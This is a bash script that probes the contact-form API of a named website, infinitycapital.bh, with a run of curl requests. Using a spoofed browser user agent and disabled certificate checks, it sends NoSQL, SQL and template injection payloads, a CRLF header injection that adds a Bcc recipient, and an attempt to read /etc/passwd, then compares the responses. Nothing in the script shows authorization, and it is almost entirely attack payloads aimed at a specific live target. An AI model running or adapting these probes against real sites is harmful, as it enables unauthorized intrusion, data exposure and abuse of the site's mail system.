#!/bin/bash
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
T='https://www.infinitycapital.bh'
send(){ # $1 = label, rest = curl data args
  local lbl="$1"; shift
  printf "%-24s " "$lbl"
  curl -sk -A "$UA" -H 'Referer: https://www.infinitycapital.bh/contact' \
    -F 'fname=D10' -F 'lname=Probe' -F 'areacode=0' -F 'tel=1234' \
    -F 'cname=D10' -F 'subject=General' -F 'msg=hello' -F 'check=1' \
    -F 'targets=test' "$@" \
    -o /tmp/sd.bin -w "HTTP=%{http_code} sz=%{size_download} " -X POST "$T/api/send"
  head -c 220 /tmp/sd.bin; echo
}
echo "=== baseline multipart (real schema) ==="
send "baseline"
echo
echo "=== NoSQL operator injection in msg ==="
send "nosqli_ne"     -F 'msg=hello"; } ; || "msg[$ne]'
echo "=== NoSQL regex ==="
send "nosqli_regex"  -F 'msg[$regex]=.*'
echo "=== SQLi in msg ==="
send "sqli_msg"      -F "msg=x' AND 1=1-- -"
echo "=== SSTI in msg ==="
send "ssti_msg"      -F 'msg={{7*7}}'
echo "=== CRLF / header injection in cname ==="
send "crlf_cname"    -F $'cname=a\r\nBcc: victim@example.org'
echo "=== targets param abuse ==="
send "targets_arr"   -F 'targets=@file:///etc/passwd'
echo DONE
